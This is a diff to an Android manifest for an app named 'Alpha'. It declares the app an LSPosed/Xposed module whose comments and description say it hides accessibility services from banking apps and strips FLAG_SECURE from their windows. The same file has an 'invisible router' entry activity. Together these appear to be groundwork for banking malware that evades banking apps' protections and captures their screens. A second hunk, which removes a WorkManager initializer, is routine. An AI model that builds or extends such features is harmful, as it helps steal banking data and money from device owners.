@@ -47,6 +47,20 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="tiramisu">
 
+        <!-- ── LSPosed / Xposed module declaration ───────────────────────── -->
+        <!-- When LSPosed is installed, Alpha acts as a module that hides     -->
+        <!-- itself from banking apps and strips FLAG_SECURE from their       -->
+        <!-- windows. Set scope: System Framework + target banking apps.      -->
+        <meta-data
+            android:name="xposedmodule"
+            android:value="true" />
+        <meta-data
+            android:name="xposeddescription"
+            android:value="Hides accessibility services from banking apps and removes FLAG_SECURE." />
+        <meta-data
+            android:name="xposedminversion"
+            android:value="82" />
+
         <!-- ── Main entry — invisible router ───────────────────────────── -->
         <activity
             android:name=".MainActivity"
@@ -173,6 +187,13 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_provider_paths" />
         </provider>
+
+        <!-- ── WorkManager on-demand init: remove auto-added initializer ────── -->
+        <!-- Required when Application implements Configuration.Provider          -->
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="${applicationId}.androidx-startup"
+            tools:node="remove" />
 
     </application>
 
